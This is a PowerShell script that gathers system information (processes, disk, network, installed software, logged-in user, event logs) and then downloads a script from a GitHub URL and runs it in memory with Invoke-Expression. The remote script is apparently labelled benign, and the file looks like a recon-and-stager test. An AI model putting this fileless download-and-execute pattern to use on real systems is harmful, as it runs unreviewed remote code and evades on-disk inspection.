Write-Output "[+] Gathering System Information..."
Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, WindowsBuildLabEx | Format-Table -AutoSize

Write-Output "[+] Listing Running Processes (Top 10)..."
Get-Process | Sort-Object CPU -Descending | Select-Object ProcessName, Id, CPU -First 10 | Format-Table -AutoSize

Write-Output "[+] Checking Disk Space Usage..."
Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -ne "A:\" -and $_.Root -ne "C:\"} | Select-Object Name, @{Name="Used(GB)";Expression={[math]::Round($_.Used / 1GB, 2)}}, @{Name="Free(GB)";Expression={[math]::Round($_.Free / 1GB, 2)}}, @{Name="Total(GB)";Expression={[math]::Round($_.Total / 1GB, 2)}} | Format-Table -AutoSize

Write-Output "[+] Fetching Network Configuration..."
Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address | Format-Table -AutoSize

Write-Output "[+] Retrieving Installed Software (Top 10)..."
Get-WmiObject -Class Win32_Product | Sort-Object Name | Select-Object Name, Version -First 10 | Format-Table -AutoSize

Write-Output "[+] Checking Current Logged-In Users..."
Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object UserName | Format-Table -AutoSize

Write-Output "[+] Fetching Recent System Event Logs (Top 5)..."
Get-WinEvent -LogName System -MaxEvents 5 | Sort-Object TimeCreated -Descending | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize

# ----------------------------
# Download and Execute Script
# ----------------------------
$scriptUrl = "https://raw.githubusercontent.com/rmadhavqh/benign-scripts/main/hello.ps1"
Write-Output "[+] Downloading and Executing Script in Memory..."
try {
    # Download the script directly into memory
    $scriptContent = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content

    # Execute the script from memory
    Invoke-Expression $scriptContent

    Write-Output "[+] Script executed successfully!"
} catch {
    Write-Output "[!] Failed to download or execute script. Error: $_"
}

